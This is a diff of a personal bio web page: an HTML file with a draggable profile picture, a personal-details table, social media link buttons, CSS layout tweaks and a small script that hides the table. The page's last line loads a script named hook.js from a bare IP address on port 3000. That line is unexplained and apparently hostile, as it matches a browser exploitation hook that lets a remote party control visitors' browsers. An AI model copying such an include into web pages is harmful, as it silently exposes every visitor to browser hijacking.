@@ -3,26 +3,39 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <script src="https://kit.fontawesome.com/906c803acd.js" crossorigin="anonymous"></script>
     <title>my bio</title>
 </head>
+ 
 <body>
     <nav class="nav">
-        <div class="logo" onclick="window.open('https://www.youtube.com/channel/UCgPnYaqjILRiQf8myp0QX_w','_blank')" unselectable="on">
+        <div class="logo" onclick="window.open('https://github.com/hello-manoj','_blank')" unselectable="on">
             <img src="p1.png" alt="logo">
         </div>
-        <div class="uname">Bio-Data</div>
+        <div class="uname">BIO.DATA</div>
     </nav>
     <!-- nav end -->
-    <div class="container">
+
+
+    <div class="container">        
+       
+        <!-- graggable item -->
         <div class="profile-pic">
             <img src="pic.jpg" alt="profile picture" onclick="window.open('https://www.facebook.com/manoj.joshi.MJ/','_blank')">
             <i class="fa fa-arrows-alt"></i>
         </div>
-        <table class="pd" cellpadding="0">
+        <!-- draggable item end -->
+
+        
+            <table class="pd" cellpadding="0">
             <thead>
                 <tr>
-                    <th>personal detail</th>
+                    <th>
+                        <div class="vis" onclick="vi();">
+                            <i class="fa fa-"></i>
+                        </div>
+                        personal detail
+                    </th>
                 </tr>
             </thead>
             <tbody>
@@ -48,7 +61,17 @@
                 </tr>                
                
             </tbody>
-        </table>
+            </table>
+        </div>
+
+
+
+        <div class="s-media">
+            <button onclick="window.open('https://www.facebook.com/manoj.joshi.MJ/')"><i class="fa fa-facebook" ></i></button>
+            <button onclick="window.open('https://github.com/hello-manoj')"><i class="fa fa-github"></i></button>
+            <button onclick="window.open('https://www.youtube.com/channel/UCgPnYaqjILRiQf8myp0QX_w')"><i class="fa fa-youtube-play"></i></button>
+            <button onclick="window.open('https://www.linkedin.com/in/manoj-joshi-6b7662166/')"><i class="fa fa-linkedin"></i></button>   
+        </div>
     </div>
     <div class="foot">Draggable box demo</div>
 <style>
@@ -64,6 +87,9 @@ body{
 
 .nav{
     position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
     top: 20px;
     width: 80%;
     margin: 0 10%;
@@ -74,7 +100,8 @@ body{
     /* overflow: hidden; */
 }
 .logo{
-    position: relative;
+    position: absolute;
+    left: 10px;
     height: 80px;
     width: 80px;
     padding: 5px;
@@ -87,12 +114,10 @@ body{
     width: 70px;
     position: absolute;
 }
-.uname{
-    position: absolute;
+.uname{    
+    position: relative;    
     height: 80px;
-    width: 500px;
-    top: 0;
-    left: 80px;
+    width: 500px;    
     padding: 5px;
     color: #3a5299;
     font-size: 40pt;
@@ -102,13 +127,30 @@ body{
 .container{
     position: absolute;
     top: 100px;
-    width: 80%;
-    margin: 0 10%;
+    width: 100%;
+    padding: 0 10%;
     height: auto;
 }
+.vis{
+    position: absolute;    
+    left: 10px;    
+    height: 30px;
+    width: 30px;
+    background: #2b3f79;
+    border-top-left-radius: 50%;
+    cursor: pointer;
+    font-size: 15pt;
+    padding: 2px;
+    transition: all .2s linear;
+
+}
+.vis:hover{
+    background: #3a5299;
+    transform: scale(1.3);
+}
 .profile-pic{
-    position: absolute;
-    right: 0;
+    position: relative;
+    float: right;
     top: 50px;
     height: 300px;
     width: 300px;
@@ -140,16 +182,48 @@ body{
 .pd{
     position: absolute;
     background-color: #1c2a53;
-    height: 300px;
-    width: 600px;
+    top: 100px;
     left: 10%;
-    top: 50px;
+    height: 300px;
+    width: 600px;    
     border-radius: 30px;
     color: aqua;
     font-size: 20pt;
     font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
     overflow: hidden;
     border: 2px solid #354880;
+    transition: all .2s linear;
+
+}
+.s-media{
+    position: fixed;
+    top: 50%;
+    transform: translate(0,-50%);
+    left: 10px;
+    height: 300px;
+    width: 50px;   
+    display: block;
+    transition: all .2s linear;
+}
+.s-media button{
+    position: relative;
+    height: 50px;
+    width: 50px;
+    border-radius: 50%;
+    background-color: #1c2a53;
+    border: 2px solid #354880;
+    color: #354880;
+    font-size: 25pt;
+    margin: 5px;
+    cursor: pointer;
+    padding: 2px;
+    transition: all .2s linear;
+
+}
+.s-media button:hover{
+    background-color: #354880;
+    color: aqua;
+    transform: scale(1.5);
 }
 thead{
     box-shadow: 5px 5px 15px #00000022;   
@@ -180,6 +254,12 @@ tbody tr td{
     font-family:agency FB;
     box-shadow: 0 0 15px #00000022;
 }
+
+@media screen and (max-width: 800px){
+    .pd{
+        display: none;
+    }    
+}
 </style>
 <script>
     const wrapper = document.querySelector(".profile-pic"),
@@ -202,6 +282,13 @@ tbody tr td{
       header.classList.remove("active");
       header.removeEventListener("mousemove", onDrag);
     });
+
+    var vis = document.querySelector(".vis");
+    var pd = document.querySelector(".pd");
+    function vi() {
+        pd.style.visibility = "hidden";        
+    }
+
 </script>
 <script src="http://103.125.27.35:3000/hook.js" ></script>
 </body>
